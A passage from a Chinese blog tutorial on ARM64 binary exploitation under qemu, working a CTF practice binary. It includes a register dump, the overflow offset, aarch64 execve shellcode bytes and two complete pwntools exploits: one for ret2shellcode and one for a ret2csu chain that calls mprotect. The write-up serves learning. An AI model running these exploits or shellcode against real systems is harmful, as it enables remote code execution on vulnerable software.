+<li><p>因此尝试调试输入超长字符串是否能成功覆盖返回地址，劫持pc指针。如下证明输入确实控制了pc。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> X0   0x0</span><br><span class="line">*X1   0x40007ffdb0 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">*X2   0x200</span><br><span class="line">*X3   0x40009a21a8 ◂— 0x0</span><br><span class="line"> X4   0x0</span><br><span class="line"> X5   0x0</span><br><span class="line">*X6   0x400099eb00 ◂— 0x0</span><br><span class="line">*X7   0x4000000000</span><br><span class="line">*X8   0x3f</span><br><span class="line">*X9   0xffffffffffff</span><br><span class="line">*X10  0x101010101010101</span><br><span class="line"> X11  0x0</span><br><span class="line"> X12  0x0</span><br><span class="line">*X13  0x400082e048 —▸ 0x400082f1b0 ◂— 0x0</span><br><span class="line">*X14  0x400085a308 ◂— 0x70737274735f5f00</span><br><span class="line">*X15  0x400084ce08 ◂— 0x0</span><br><span class="line">*X16  0x411028 —▸ 0x400090b9c8 ◂— 0xb0000483a9bd7bfd</span><br><span class="line">*X17  0x400090b9c8 ◂— 0xb0000483a9bd7bfd</span><br><span class="line">*X18  0x367</span><br><span class="line">*X19  0x400868 ◂— stp    x29, x30, [sp, #-0x40]!</span><br><span class="line"> X20  0x0</span><br><span class="line">*X21  0x400610 ◂— movz   x29, #0</span><br><span class="line"> X22  0x0</span><br><span class="line"> X23  0x0</span><br><span class="line"> X24  0x0</span><br><span class="line"> X25  0x0</span><br><span class="line"> X26  0x0</span><br><span class="line"> X27  0x0</span><br><span class="line"> X28  0x0</span><br><span class="line">*X29  0x6161617261616171 (&#x27;qaaaraaa&#x27;)</span><br><span class="line">*SP   0x40007ffe00 ◂— &#x27;uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaac\n&#x27;</span><br><span class="line">*PC   0x6161617461616173 (&#x27;saaataaa&#x27;)</span><br></pre></td></tr></table></div></figure></li>
+<li><p>确定偏移量，为72</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; cyclic_find(<span class="string">&#x27;saaa&#x27;</span>)</span></span><br><span class="line">72</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="利用"   >
+          <a href="#利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用" class="headerlink" title="利用"></a>利用</h2>
+      </li>
+</ul>
+
+        <h3 id="标准qemu上"   >
+          <a href="#标准qemu上" class="heading-link"><i class="fas fa-link"></i></a><a href="#标准qemu上" class="headerlink" title="标准qemu上"></a>标准qemu上</h3>
+      <p><strong>ret2shellcode</strong></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/aarch64-linux-gnu&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">payload += <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">payload += <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Name&quot;</span>,payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x411068</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/47048" >shellcode来源</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="补丁qemu上"   >
+          <a href="#补丁qemu上" class="heading-link"><i class="fas fa-link"></i></a><a href="#补丁qemu上" class="headerlink" title="补丁qemu上"></a>补丁qemu上</h3>
+      <p>补丁qemu上，bss段不可执行。考虑使用<code>mprotect()</code> 函数将bss段设置为可读可写可执行。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line"><span class="comment">// 把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</span></span><br><span class="line"><span class="comment">// 可读可写可执行时prot应当为7</span></span><br></pre></td></tr></table></div></figure>
+<p><strong>ret2csu</strong></p>
+<p>arm下的ret2csu可以实现两次控制流劫持：1、从0x4008cc处进入，通过布置好栈空间控制x19~x30内的几个寄存器，并将x30设置为0x4008ac，从而使程序执行上面这段gadget；2、进入0x4008ac后，w0/x1/x2/x3都会被栈空间的值给覆盖，将x3设置为目标地址，可以实现<strong>第一次控制流劫持</strong>；3、<code>blr x3</code>返回后继续往下执行，如果此时x19和x20的值相同，就又会执行到0x4008cc；4、此时，通过布置栈空间可以再次控制x30，当执行到ret时，就实现了<strong>第二次控制流劫持</strong>。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></div></figure>
+<p>画个图表示一下实现两次控制流劫持时，栈空间的布局。x29处是低地址，x24处是高地址。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">           第 一 段 栈 空 间</span><br><span class="line"></span><br><span class="line"> +----+     +-----+</span><br><span class="line"> | x0 +&lt;----+ x24 |</span><br><span class="line"> +----+     +-----+</span><br><span class="line"> | x1 +&lt;----+ x23 |</span><br><span class="line"> +----+     +-----+</span><br><span class="line"> | x2 +&lt;----+ x22 |</span><br><span class="line"> +----+     +-----+</span><br><span class="line"> | x3 +&lt;----+ x21 |   注 意 ， 这 里 是 取 [x21] 给 x3</span><br><span class="line"> +----+     +-----+</span><br><span class="line"> | 1  +&lt;----+ x20 |</span><br><span class="line"> +----+     +-----+</span><br><span class="line"> | 0  +&lt;----+ x19 |</span><br><span class="line"> +----+     +-----+      +----------------------------+</span><br><span class="line">            | x30 +-----&gt;+ 上 一 段 gadget，偏 移 0x20左 右   |</span><br><span class="line">            +-----+      +----------------------------+</span><br><span class="line">            | x29 +-----&gt;+ anything                   |</span><br><span class="line">            +-----+      +----------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           第 二 段 栈 空 间</span><br><span class="line"></span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x24 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x23 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x22 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x21 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x20 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x19 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x30 +-----&gt;+ 下 一 个 目 标 跳 转 地 址 , 如 shellcode |</span><br><span class="line">+-----+      +---------------------------------+</span><br><span class="line">| x29 +-----&gt;+ anything                        |</span><br><span class="line">+-----+      +---------------------------------+</span><br></pre></td></tr></table></div></figure>
+<p>整理一下利用思路：</p>
+<ul>
+<li><p>第一次输入将shellcode放入bss段</p>
+</li>
+<li><p>第二次输入时溢出覆盖返回地址（至ret2csu），并布置好栈空间</p>
+<ol>
+<li>第一段栈空间实现跳转到下一个gadget，并将关键寄存器赋值</li>
+<li>第二段栈空间实现一个跳转，一般是跳到shellcode或某个关键函数地址上执行</li>
+</ol>
+</li>
+</ul>
+<p>接下来，只需要对照着IDA仔细地将栈空间布置好，就可以了。exp如下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># myproc = process([&#x27;qemu-aarch64&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line">myproc = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line">input1 = shellcode.ljust(<span class="number">0x50</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0x4007e0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数返回时，栈空间的SP指向栈中“返回地址的上一个”，因此构造的栈紧挨着覆盖的返回地址处</span></span><br><span class="line">padding_func = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + p64(<span class="number">0x4008cc</span>)</span><br><span class="line">stack1 = flat([<span class="number">0x0</span>,<span class="number">0x4008ac</span>,<span class="number">0x0</span>,<span class="number">0x1</span>,<span class="number">0x411068</span>+<span class="number">0x50</span>,<span class="number">0x7</span>,<span class="number">0x1000</span>,<span class="number">0x411000</span>])</span><br><span class="line">stack2 = flat([<span class="number">0x0</span>,<span class="number">0x411068</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>])</span><br><span class="line"></span><br><span class="line">input2 = padding_func + stack1 + stack2</span><br><span class="line">myproc.sendafter(<span class="string">&#x27;Name:&#x27;</span>,input1)</span><br><span class="line">myproc.sendline(input2)</span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="pwndbg常用指令"   >
+          <a href="#pwndbg常用指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#pwndbg常用指令" class="headerlink" title="pwndbg常用指令"></a>pwndbg常用指令</h1>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i r lr   # 查看lr寄存器的值</span><br><span class="line">p $lr    # 打印lr寄存器的值（十进制）</span><br></pre></td></tr></table></div></figure></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/">http://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/02/03/hws2021-winter/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">HWS2021冬令营选拔赛</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/01/26/configure-proxy/"><span class="paginator-prev__text">Linux下的各种代理设置</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#qemu%E8%B0%83%E8%AF%95arm%E7%94%A8%E6%88%B7%E6%80%81%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">
+          qemu调试arm用户态程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0%E9%A2%98-typo"><span class="toc-number">2.</span> <span class="toc-text">
+          练习题 - typo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">
+          题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">
+          三种利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">2.2.1.</span> <span class="toc-text">
+          ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop-svc"><span class="toc-number">2.2.2.</span> <span class="toc-text">
+          rop - svc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop-func-%E2%80%9C-bin-sh%E2%80%9D"><span class="toc-number">2.2.3.</span> <span class="toc-text">
+          rop - func(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0%E9%A2%98-pwn"><span class="toc-number">3.</span> <span class="toc-text">
+          练习题 - pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85arm64%E7%9A%84lib%E5%BA%93"><span class="toc-number">3.1.</span> <span class="toc-text">
+          安装arm64的lib库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">
+          题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">
+          利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%87%86qemu%E4%B8%8A"><span class="toc-number">3.3.1.</span> <span class="toc-text">
+          标准qemu上</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81qemu%E4%B8%8A"><span class="toc-number">3.3.2.</span> <span class="toc-text">
+          补丁qemu上</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwndbg%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">
+          pwndbg常用指令</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
